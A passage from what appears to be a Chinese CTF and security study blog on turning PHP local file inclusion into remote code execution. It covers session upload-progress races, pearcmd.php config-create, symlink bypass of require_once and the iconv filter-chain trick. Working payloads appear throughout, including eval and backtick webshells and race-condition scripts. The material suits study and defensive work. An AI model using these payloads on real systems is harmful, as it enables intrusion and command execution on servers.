class=\"line\">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Origin: http://127.0.0.1:18888</span><br><span class=\"line\">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary6O4h5F4Qzy538QaC</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\">Sec-Fetch-Site: same-origin</span><br><span class=\"line\">Sec-Fetch-Mode: navigate</span><br><span class=\"line\">Sec-Fetch-User: ?1</span><br><span class=\"line\">Sec-Fetch-Dest: document</span><br><span class=\"line\">Referer: http://127.0.0.1:18888/file_upload.php</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Cookie: PHPSESSID=9pji5c42u9migge868i8u083r7; ZDEDebuggerPresent=php,phtml,php3</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\"></span><br><span class=\"line\">------WebKitFormBoundary6O4h5F4Qzy538QaC</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;123.txt&quot;</span><br><span class=\"line\">Content-Type: text/plain</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?php phpinfo(); ?&gt;</span><br><span class=\"line\">------WebKitFormBoundary6O4h5F4Qzy538QaC</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">提交</span><br><span class=\"line\">------WebKitFormBoundary6O4h5F4Qzy538QaC--</span><br></pre></td></tr></table></figure>\n<p>写 python 包崩溃</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">from io import BytesIO</span><br><span class=\"line\">import re</span><br><span class=\"line\">files = &#123;</span><br><span class=\"line\">  &#x27;file&#x27;: BytesIO(&#x27;&lt;?php eval($_REQUEST[sky]);&#x27;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">url = &#x27;http://ip/index.php?file=php://filter/string.strip_tags/resource=/etc/passwd&#x27;</span><br><span class=\"line\">try:</span><br><span class=\"line\">r = requests.post(url=url, files=files, allow_redirects=False)</span><br><span class=\"line\">except:</span><br><span class=\"line\">url = &#x27;http://ip/dir.php&#x27;</span><br><span class=\"line\">r = requests.get(url)</span><br><span class=\"line\">data = re.search(r&quot;php[a-zA-Z0-9]&#123;1,&#125;&quot;, r.content).group(0)</span><br><span class=\"line\">url = &quot;http://ip/index.php?file=/tmp/&quot;+data</span><br><span class=\"line\">data = &#123;</span><br><span class=\"line\">&#x27;sky&#x27;:&quot;readfile(&#x27;/flag&#x27;);&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">r =  requests.post(url=url,data=data)</span><br><span class=\"line\">print r.content</span><br></pre></td></tr></table></figure>\n<h2 id=\"docker中文件包含\"><a class=\"markdownIt-Anchor\" href=\"#docker中文件包含\">#</a> docker 中文件包含</h2>\n<p>1. 包含日志文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">access.log -&gt; /dev/stdout</span><br><span class=\"line\">error.log -&gt; /dev/stderr</span><br></pre></td></tr></table></figure>\n<p>此时日志被重定向到标准输出中，不能包含</p>\n<p>此时包含这些 Web 日志会出现 <code>include(/dev/pts/0): failed to open stream: Permission denied</code>  的错误，因为 PHP 没有权限包含设备文件：</p>\n<p>远程包含因为默认不开启，所以我们也不作为一个候选项，想要 getshell 还是需要找到一个可以控制内容的文件进行包含。</p>\n<p>2.phpinfo 文件包含</p>\n<p>同样 post 一个大文件，然后利用时间竞争</p>\n<p>脚本和之前的脚本类似，但更改了切片的位置</p>\n<p><code>fn = d[i+17:i+31]</code></p>\n<p>3.Windows 中通配符</p>\n<p>在临时文件包含中，我们详细讲过通配符</p>\n<ul>\n<li>DOS_STAR：即  <code>&lt;</code> ，匹配 0 个以上的字符</li>\n<li>DOS_QM：即 <code>&gt;</code> ，匹配 1 个字符</li>\n<li>DOS_DOT：即 <code>&quot;</code> ，匹配点号</li>\n</ul>\n<p>有了通配符，我们就可以匹配临时文件，并修改其内容</p>\n<p>一般我们会用 fputs 和 fopen 写到临时文件中，这样临时文件即使删除，我们可以将我们的马写到其他的目录中</p>\n<p>4.session.upload_progress</p>\n<p>php version &gt; 7</p>\n<p>session.auto_start 顾名思义，如果开启这个选项，则 PHP 在接收请求的时候会自动初始化 Session，不再需要执行 session_start ()。但默认情况下，也是通常情况下，这个选项都是关闭的。</p>\n<p>session.upload_progress 最初是 PHP 为上传进度条设计的一个功能，在上传文件较大的情况下，PHP 将进行流式上传，并将进度信息放在 Session 中（包含用户可控的值），即使此时用户没有初始化 Session，PHP 也会自动初始化 Session。</p>\n<p>PHP 在开启了 <code>session.upload_progress.enable</code>  后（在包括 Docker 的大部分环境下默认是开启的），将会把用户上传文件的信息保存在 Session 中，而 PHP 的 Session 默认是保存在文件里的。</p>\n<p>利用条件：</p>\n<ul>\n<li>目标环境开启了 <code>session.upload_progress.enable</code>  选项</li>\n<li>发送一个文件上传请求，其中包含一个文件表单和一个名字是 <code>PHP_SESSION_UPLOAD_PROGRESS</code>  的字段</li>\n<li>请求的 Cookie 中包含 Session ID</li>\n</ul>\n<p>构造如下上传包</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form action=&quot;upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class=\"line\">    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;</span><br><span class=\"line\">    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;</span><br><span class=\"line\">\t&lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;&lt;?php phpinfo(); ?&gt;&quot; /&gt;</span><br><span class=\"line\">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>上传抓包时设置 cookie: PHPSESSID=hahaha</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /web10.php HTTP/1.1</span><br><span class=\"line\">Host: 127.0.0.1:18888</span><br><span class=\"line\">Content-Length: 426</span><br><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\">sec-ch-ua: &quot;Chromium&quot;;v=&quot;97&quot;, &quot; Not;A Brand&quot;;v=&quot;99&quot;</span><br><span class=\"line\">sec-ch-ua-mobile: ?0</span><br><span class=\"line\">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Origin: http://127.0.0.1:18888</span><br><span class=\"line\">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfiKjPC47H7ESbbdB</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\">Referer: http://127.0.0.1:18888/file_upload.php</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Cookie: PHPSESSID=2333333; ZDEDebuggerPresent=php,phtml,php3</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\"></span><br><span class=\"line\">------WebKitFormBoundaryfiKjPC47H7ESbbdB</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;123.txt&quot;</span><br><span class=\"line\">Content-Type: text/plain</span><br><span class=\"line\"></span><br><span class=\"line\">nishishabi</span><br><span class=\"line\">------WebKitFormBoundaryfiKjPC47H7ESbbdB</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!DOCTYPE html PUBLIC </span><br><span class=\"line\">------WebKitFormBoundaryfiKjPC47H7ESbbdB</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">提交</span><br><span class=\"line\">------WebKitFormBoundaryfiKjPC47H7ESbbdB--</span><br></pre></td></tr></table></figure>\n<p>上传后我们可以控制文件名，就是我们的 PHPSESSID，但临时文件内容是空的</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221102153200577.png\" alt=\"image-20221102153200577\"></p>\n<p>可见，我在上传文件的同时，POST 了一个名为 PHP_SESSION_UPLOAD_PROGRESS 的字段，其值为 bbbbbbb。（PHP_SESSION_UPLOAD_PROGRESS 是在 php.ini 里定义的 session.upload_progress.name）只要上传包里带上这个键，PHP 就会自动启用 Session，又因为我在 Cookie 中设置了 PHPSESSID=aaaaaaa，所以 Session 文件将会自动创建。</p>\n<p>但它的大小为什么是 0 呢？因为上传结束后，这个 Session 将会被自动清除（由 session.upload_progress.cleanup 定义），我们只需要条件竞争，赶在文件被清除前利用即可。</p>\n<p>通过竞争实现删除之前包含</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import io</span><br><span class=\"line\">import requests</span><br><span class=\"line\">import threading</span><br><span class=\"line\"></span><br><span class=\"line\">sessid = &#x27;23333&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def t1(session):</span><br><span class=\"line\">    while True:</span><br><span class=\"line\">        f = io.BytesIO(b&#x27;a&#x27; * 1024 * 50)</span><br><span class=\"line\">        response = session.post(</span><br><span class=\"line\">            &#x27;http://127.0.0.1:18888/file_upload.php&#x27;,</span><br><span class=\"line\">            data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?=phpinfo()?&gt;&#x27;&#125;,</span><br><span class=\"line\">            files=&#123;&#x27;file&#x27;: (&#x27;a.txt&#x27;, f)&#125;,</span><br><span class=\"line\">            cookies=&#123;&#x27;PHPSESSID&#x27;: sessid&#125;</span><br><span class=\"line\">        )</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def t2(session):</span><br><span class=\"line\">    while True:</span><br><span class=\"line\">        response = session.get(f&#x27;http://192.168.1.7/xss_location/include/session_upload.php?file=C:/windows/sess_&#123;sessid&#125;&#x27;)</span><br><span class=\"line\">        print(response.text)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">with requests.session() as session:</span><br><span class=\"line\">    t1 = threading.Thread(target=t1, args=(session,))</span><br><span class=\"line\">    t1.daemon = True</span><br><span class=\"line\">    t1.start()</span><br><span class=\"line\"></span><br><span class=\"line\">    t2(session)</span><br></pre></td></tr></table></figure>\n<p><code>&lt;?=phpinfo();?&gt;</code>   可以改为写文件，在自定义的路径下写文件，然后在包含，这样无需解决路径和文件名的问题</p>\n<p>5. 通过 string.strip-tag 导致 php 崩溃</p>\n<p>在 docker 中也是可以用的，具体看上面</p>\n<p>6.pearcmd.php</p>\n<p>pecl 是 PHP 中用于管理扩展而使用的命令行工具，而 pear 是 pecl 依赖的类库。在 7.3 及以前，pecl/pear 是默认安装的；在 7.4 及以后，需要我们在编译 PHP 的时候指定 <code>--with-pear</code>  才会安装。</p>\n<p>不过，在 Docker 任意版本镜像中，pcel/pear 都会被默认安装，安装的路径在 <code>/usr/local/lib/php</code> 。</p>\n<p>Docker 环境下的 PHP 会开启 <code>register_argc_argv</code>  这个配置。当开启了这个选项，用户的输入将会被赋予给 <code>$argc</code> 、 <code>$argv</code> 、 <code>$_SERVER['argv']</code>  几个变量。</p>\n<p>这意味着，HTTP 数据包中的 query-string 会被作为 argv 的值</p>\n<p><code>[PHP 7.3.33 - phpinfo()](http://127.0.0.1:18888/phpinfo.php?uuuuuuu)</code></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221102164711562.png\" alt=\"image-20221102164711562\"></p>\n<p>如果 query-string 中不包含没有编码的 <code>=</code> ，且请求是 GET 或 HEAD，则 query-string 需要被作为命令行参数。</p>\n<p>PHP 现在仍然没有严格按照 RFC 来处理，即使我们传入的 query-string 包含等号，也仍会被赋值给 <code>$_SERVER['argv']</code> 。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">D:\\xampp\\php&gt;php.exe pear/pearcmd.php</span><br><span class=\"line\">Commands:</span><br><span class=\"line\">build                  Build an Extension From C Source</span><br><span class=\"line\">bundle                 Unpacks a Pecl Package</span><br><span class=\"line\">channel-add            Add a Channel</span><br><span class=\"line\">channel-alias          Specify an alias to a channel name</span><br><span class=\"line\">channel-delete         Remove a Channel From the List</span><br><span class=\"line\">channel-discover       Initialize a Channel from its server</span><br><span class=\"line\">channel-info           Retrieve Information on a Channel</span><br><span class=\"line\">channel-login          Connects and authenticates to remote channel server</span><br><span class=\"line\">channel-logout         Logs out from the remote channel server</span><br><span class=\"line\">channel-update         Update an Existing Channel</span><br><span class=\"line\">clear-cache            Clear Web Services Cache</span><br><span class=\"line\">config-create          Create a Default configuration file</span><br></pre></td></tr></table></figure>\n<p>create-config 是可以创建文件的，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。</p>\n<p>因此我们最终构造的 payload 如下 <code>GET /index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php HTTP/1.1</code></p>\n<p>简单解释一下，这里的 config-create 会被当做命令行参数执行，执行的第一个参数是要写的文件内容，第二个参数是稳健位置，然后在通过包含即可</p>\n<p>这个好就好在，docker 下的 php 默认都是开这个选项的，而且不用时间竞争，而且路径文件名可控，即使不是 docker 下，仍可以尝试，万一人家要安装依赖没关呢</p>\n<h2 id=\"通过多级软链接绕过require_once\"><a class=\"markdownIt-Anchor\" href=\"#通过多级软链接绕过require_once\">#</a> 通过多级软链接绕过 require_once</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php require_once &#x27;/www/config.php&#x27;; // some logic here... </span><br><span class=\"line\">\t  require_once $_GET[&#x27;file&#x27;]; </span><br><span class=\"line\">?&gt; </span><br></pre></td></tr></table></figure>\n<p>如果我们想要读取 /www/config.php 中的文件，通常可以通过 php://filter 来读取，比如 <code>1.1.1.1/a.php?file=php://filter/read=convert.base64-encode/resource=/www/config.php</code> ，但但如果这个文件在前面已经被包含过了，则第二次包含就会失败，即使使用 php://filter 也一样。</p>\n<p>正常情况下，PHP 会将用户输入的文件名进行 resolve，转换成标准的绝对路径，这个转换的过程会将…/、./、软连接等都进行计算，得到一个最终的路径，再进行包含。每次包含都会经历这个过程，所以，只要是相同的文件，不管中间使用了…/ 进行跳转，还是使用软连接进行跳转，都逃不过最终被转换成原始路径的过程，也就绕不过 require_once。</p>\n<p>但是，如果软连接跳转的次数超过了某一个上限，Linux 的 lstat 函数就会出错，导致 PHP 计算出的绝对路径就会包含一部分软连接的路径，也就和原始路径不相同的，即可绕过 require_once 限制。</p>\n<p><code>/proc/self</code>  指向当前进程的 <code>/proc/pid/</code> ， <code>/proc/self/root/</code>  是指向 <code>/</code>  的符号链接，在 Linux 下，最常见的软连接就是 /proc/self/root，这个路径指向根目录。所以，我们可以多次使用这个路径：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">require_once &#x27;/www/config.php&#x27;;</span><br><span class=\"line\">include_once &#x27;/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/www/config.php&#x27;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"hxp-ctf\"><a class=\"markdownIt-Anchor\" href=\"#hxp-ctf\">#</a> hxp ctf</h2>\n<h3 id=\"the-end-of-lfi\"><a class=\"markdownIt-Anchor\" href=\"#the-end-of-lfi\">#</a> the end of LFI</h3>\n<p>在 PHP 中，我们可以利用 PHP Base64 Filter 宽松的解析，通过 iconv filter 等编码组合构造出特定的 PHP 代码进而完成无需<strong>临时文件</strong>的 RCE 。</p>\n<p>前置知识 0x00</p>\n<p>php://filter ，当使用 base64-decode 时，字符 &lt;、?、;、&gt;、空格等一共有 7 个字符不符合 base64 编码的字符范围将被忽略，而合法字符将被正常解码，我们的正常字符包括 <code>A-Za-z0-9\\/\\=\\+</code> 。同时需要注意，base64 在编码的时候是四个字节为一组的，这个在上面 session 包含中有过详细解释</p>\n<p>举个师傅的例子:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$a = &quot;\\x1bY\\xffQ\\xfa&quot;;              //YQ 为 a 的 base64 编码</span><br><span class=\"line\">var_dump(base64_decode($a));</span><br><span class=\"line\"></span><br><span class=\"line\">// string(1) &quot;a&quot;</span><br></pre></td></tr></table></figure>\n<p>很明显，我们的不可见字符，控制字符也被忽略了</p>\n<p><strong>因此我们可以使用 base64 先 decode 在 incode 来去除 base64 不认可的非法字符，这是我们后面做题的基础</strong></p>\n<p>前置知识 0x01 包含文件中的 php 代码</p>\n<p>假如我们有一个文件 e，文件中的内容是：PD9waHAgcGhwaW5mbygpOw==，即 <code>&lt;?php phpinfo();</code>  的 base64 编码，我们有两种方式包含：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include &quot;php://filter/convert.base64-decode/resource=./e&quot;;</span><br><span class=\"line\">include &quot;php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOw==&quot;;</span><br></pre></td></tr></table></figure>\n<p><code>include</code>  函数实际包含的是 Base64 解码后的 PHP 代码。</p>\n<p>前置知识 0x02 convert.iconv</p>\n<p>PHP Filter 当中有一种  <code>convert.iconv</code>  的 Filter ，可以用来将数据从字符集 A 转换为字符集 B ，其中这两个字符集可以从  <code>iconv -l</code>  获得，这个字符集比较长，不过也存在一些实际上是其他字符集的别名。</p>\n<p>举个例子，我们可以从 utf8 转换为 utf7 的编码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$url = &quot;php://filter/convert.iconv.UTF-8%2fUTF-7/resource=data:,some&lt;&gt;text&quot;;</span><br><span class=\"line\">echo file_get_contents($url);</span><br><span class=\"line\">// Output:</span><br><span class=\"line\">// some+ADwAPg-text</span><br></pre></td></tr></table></figure>\n<p>可以看到，我们在转换的同时成了一些其他的字符，比如 <code>+ADwAPg-</code></p>\n<p>这样结合我们的 base64 的 decode 忽略非法字符，和文件内容包含，也许可以直接转换出我们的 webshell</p>\n<p>比如我们可以通过 UTF8 转 CSISO2022KR 得到字符 C：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$url = &quot;php://filter/&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">$url .= &quot;convert.iconv.UTF8.CSISO2022KR&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">$url .= &quot;/resource=data://,aaaaaaaaaaaaaa&quot;;     //我们这里简单使用 `data://` 来模拟文件内容读取。</span><br><span class=\"line\">var_dump(file_get_contents($url));</span><br><span class=\"line\"></span><br><span class=\"line\">// hexdump:</span><br><span class=\"line\">// 00000000  73 74 72 69 6e 67 28 31  38 29 20 22 1b 24 29 43  |string(18) &quot;.$)C|</span><br><span class=\"line\">// 00000010  61 61 61 61 61 61 61 61  61 61 61 61 61 61 22 0a  |aaaaaaaaaaaaaa&quot;.|</span><br></pre></td></tr></table></figure>\n<p>而 c 之前的非法字符，我们只需要利用 decode+incode 去除即可</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$url = &quot;php://filter/&quot;;</span><br><span class=\"line\">$url .= &quot;convert.iconv.UTF8.CSISO2022KR&quot;;</span><br><span class=\"line\">$url .= &quot;|convert.base64-decode|convert.base64-encode&quot;;</span><br><span class=\"line\">$url .= &quot;/resource=data://,aaaaaaaaaaaaaa&quot;;</span><br><span class=\"line\">var_dump(file_get_contents($url));</span><br><span class=\"line\"></span><br><span class=\"line\">// hexdump</span><br><span class=\"line\">// 00000000  73 74 72 69 6e 67 28 31  32 29 20 22 43 61 61 61  |string(12) &quot;Caaa|</span><br><span class=\"line\">// 00000010  61 61 61 61 61 61 61 61  22 0a                    |aaaaaaaa&quot;.|</span><br></pre></td></tr></table></figure>\n<p>前置知识结束，我们开始构造 payload：</p>\n<p>由于 <code>&lt;</code>  在 base64 是非法字符，我们无法直接构造 <code>&lt;?php</code>  的形式，但我们可以构造 <code>&lt;?php</code> base64 encode 过后的编码，在使用 base64decode 还原即可正常包含</p>\n<p>构造 <code>&lt;</code>  我们可以生成 PAxxxxx 的编码，解码过后我们就可以生成 &lt;，我们接下来要做的就是能找到可以通过编码转换生成我们需要的字符，但后面也可能生成垃圾字符，我们只需要 decode+incode 就可以去除</p>\n<p>我们最后的 webshell 长这样： <code>PD89YCRfR0VUWzBdYDs7Pz4=</code>  是</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?=`$_GET[0]\\`;;?&gt;</span><br></pre></td></tr></table></figure>\n<p>编码后的结果，两个；；的原因是一个；的 base64  <code>PD89YCRfR0VUWzBdYDs/Pg==</code>  中间有个 /，通过编码转换不好找的这个字符</p>\n<p>其实我发现</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?=`$_GET[0]`; ?&gt;</span><br></pre></td></tr></table></figure>\n<p>你也可以加个空格，这样也不会有 \\， <code>PD89YCRfR0VUWzBdYDsgPz4=</code></p>\n<p>最终我们的脚本长这样：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$base64_payload = &quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;;</span><br><span class=\"line\">$conversions = array(</span><br><span class=\"line\">    &#x27;R&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;,</span><br><span class=\"line\">    &#x27;B&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;,</span><br><span class=\"line\">    &#x27;C&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR&#x27;,</span><br><span class=\"line\">    &#x27;8&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;,</span><br><span class=\"line\">    &#x27;9&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;,</span><br><span class=\"line\">    &#x27;f&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;,</span><br><span class=\"line\">    &#x27;s&#x27; =&gt; 